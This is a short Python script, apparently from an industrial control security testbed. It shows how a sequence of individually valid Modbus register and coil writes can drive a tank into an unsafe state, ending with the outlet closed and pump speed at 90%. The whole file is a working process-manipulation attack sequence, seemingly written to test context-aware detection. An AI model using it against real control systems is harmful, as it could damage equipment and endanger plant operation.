"""Reproducible valid-but-unsafe command using only real Modbus operations.

The script creates a genuine low-level process context: it lowers the target,
stops the inlet pump, and lets the open outlet drain the tank.  It then closes
the outlet and requests high pump demand.  It never writes tank level directly.
"""
import time
from _client import client, send
connection = client()
try:
    send(connection.write_register(1, 2000), "tank setpoint = 20%")
    send(connection.write_register(5, 10000), "open outlet valve fully")
    send(connection.write_coil(0, False), "stop inlet pump")
    print("Creating a low-level tank condition through the outlet (about 80 seconds from reset)...")
    for _ in range(100):
        level = connection.read_holding_registers(0, count=1).registers[0] / 100
        if level <= 18:
            break
        time.sleep(1)
    else:
        raise SystemExit("Tank did not reach the low-level context; check that the valve is open.")
    send(connection.write_coil(1, False), "close outlet valve")
    send(connection.write_register(4, 9000), "SET_PUMP_SPEED = 90%")
    print(f"Sent valid Modbus SET_PUMP_SPEED = 90% at tank level {level:.1f}% with valve closed")
finally:
    connection.close()
